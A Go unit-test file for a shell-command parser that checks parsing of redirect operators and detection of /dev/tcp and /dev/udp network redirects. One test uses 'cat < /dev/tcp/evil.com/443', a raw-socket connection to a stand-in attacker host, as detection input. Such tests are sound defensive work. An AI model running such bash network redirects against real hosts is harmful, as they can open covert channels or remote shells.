package shellparse

import "testing"

// ----------------------------------------------------------------------------
// Basic redirects
// ----------------------------------------------------------------------------

func TestRedirectSpacedWrite(t *testing.T) {
	cmds := mustSplit(t, "echo hi > /tmp/out")
	cmd := cmds[0]
	expectArgv(t, cmd, "echo", "hi")
	if len(cmd.Redirects) != 1 {
		t.Fatalf("redirects = %v", cmd.Redirects)
	}
	r := cmd.Redirects[0]
	if r.Op != ">" || r.FD != 1 || r.Target != "/tmp/out" {
		t.Errorf("redir = %+v", r)
	}
}

func TestRedirectUnspacedWrite(t *testing.T) {
	cmds := mustSplit(t, "echo hi >/tmp/out")
	cmd := cmds[0]
	expectArgv(t, cmd, "echo", "hi")
	if len(cmd.Redirects) != 1 {
		t.Fatalf("redirects = %v", cmd.Redirects)
	}
	r := cmd.Redirects[0]
	if r.Op != ">" || r.FD != 1 || r.Target != "/tmp/out" {
		t.Errorf("redir = %+v", r)
	}
}

func TestRedirectAppend(t *testing.T) {
	cmds := mustSplit(t, "echo hi >> log")
	r := cmds[0].Redirects[0]
	if r.Op != ">>" || r.FD != 1 || r.Target != "log" {
		t.Errorf("redir = %+v", r)
	}
}

func TestRedirectStderr(t *testing.T) {
	cmds := mustSplit(t, "cmd 2> err.log")
	r := cmds[0].Redirects[0]
	if r.Op != ">" || r.FD != 2 || r.Target != "err.log" {
		t.Errorf("redir = %+v", r)
	}
}

func TestRedirectStderrToStdout(t *testing.T) {
	cmds := mustSplit(t, "cmd 2>&1")
	r := cmds[0].Redirects[0]
	if r.Op != ">&" || r.FD != 2 || r.Target != "1" {
		t.Errorf("redir = %+v", r)
	}
}

func TestRedirectBothOutputs(t *testing.T) {
	cmds := mustSplit(t, "cmd &> all.log")
	r := cmds[0].Redirects[0]
	if r.Op != "&>" || r.Target != "all.log" {
		t.Errorf("redir = %+v", r)
	}
}

func TestRedirectHereString(t *testing.T) {
	cmds := mustSplit(t, "tr a b <<< input-text")
	cmd := cmds[0]
	expectArgv(t, cmd, "tr", "a", "b")
	if len(cmd.Redirects) != 1 {
		t.Fatalf("redirects = %v", cmd.Redirects)
	}
	r := cmd.Redirects[0]
	if r.Op != "<<<" || r.Target != "input-text" {
		t.Errorf("redir = %+v", r)
	}
}

func TestMultipleRedirects(t *testing.T) {
	cmds := mustSplit(t, "cmd < in > out 2> err")
	rs := cmds[0].Redirects
	if len(rs) != 3 {
		t.Fatalf("redirects = %v", rs)
	}
	if rs[0].Op != "<" || rs[0].Target != "in" || rs[0].FD != 0 {
		t.Errorf("redir[0] = %+v", rs[0])
	}
	if rs[1].Op != ">" || rs[1].Target != "out" || rs[1].FD != 1 {
		t.Errorf("redir[1] = %+v", rs[1])
	}
	if rs[2].Op != ">" || rs[2].Target != "err" || rs[2].FD != 2 {
		t.Errorf("redir[2] = %+v", rs[2])
	}
}

// ----------------------------------------------------------------------------
// /dev/tcp detection
// ----------------------------------------------------------------------------

func TestDevTCPInRedirect(t *testing.T) {
	cmds := mustSplit(t, "cat < /dev/tcp/evil.com/443")
	cmd := cmds[0]
	expectArgv(t, cmd, "cat")
	if len(cmd.Redirects) != 1 || cmd.Redirects[0].Target != "/dev/tcp/evil.com/443" {
		t.Errorf("redirects = %+v", cmd.Redirects)
	}
	host, port, kind, ok := IsDevTCP(cmd.Redirects[0].Target)
	if !ok || host != "evil.com" || port != "443" || kind != "tcp" {
		t.Errorf("IsDevTCP = %q %q %q %v", host, port, kind, ok)
	}
}

func TestDevUDP(t *testing.T) {
	host, port, kind, ok := IsDevTCP("/dev/udp/192.168.1.1/53")
	if !ok || host != "192.168.1.1" || port != "53" || kind != "udp" {
		t.Errorf("got %q %q %q %v", host, port, kind, ok)
	}
}

func TestIsDevTCPNegatives(t *testing.T) {
	for _, s := range []string{
		"/dev/null",
		"/dev/tcp/",
		"/dev/tcp/host",
		"/dev/tcp/host/",
		"/usr/bin/bash",
		"",
	} {
		_, _, _, ok := IsDevTCP(s)
		if ok {
			t.Errorf("IsDevTCP(%q) returned ok=true", s)
		}
	}
}

// ----------------------------------------------------------------------------
// Operator matcher unit tests
// ----------------------------------------------------------------------------

func TestMatchRedirOperator(t *testing.T) {
	cases := []struct {
		in     string
		wantOp string
		wantFD int
		rest   string
		ok     bool
	}{
		{">", ">", 1, "", true},
		{"<", "<", 0, "", true},
		{">>", ">>", 1, "", true},
		{"<<", "<<", 0, "", true},
		{"<<<", "<<<", 0, "", true},
		{"&>", "&>", 1, "", true},
		{"&>>", "&>>", 1, "", true},
		{">&", ">&", 1, "", true},
		{"<&", "<&", 0, "", true},
		{"2>", ">", 2, "", true},
		{"2>&1", ">&", 2, "1", true},
		{"1>out.log", ">", 1, "out.log", true},
		{"2>>log", ">>", 2, "log", true},
		{"cat", "", 0, "", false},
		{"1", "", 0, "", false},
		{"123", "", 0, "", false},
	}
	for _, c := range cases {
		op, rest, fd, ok := matchRedirOperator(c.in)
		if ok != c.ok || op != c.wantOp || rest != c.rest || fd != c.wantFD {
			t.Errorf("match(%q) = (%q,%q,%d,%v) want (%q,%q,%d,%v)",
				c.in, op, rest, fd, ok, c.wantOp, c.rest, c.wantFD, c.ok)
		}
	}
}
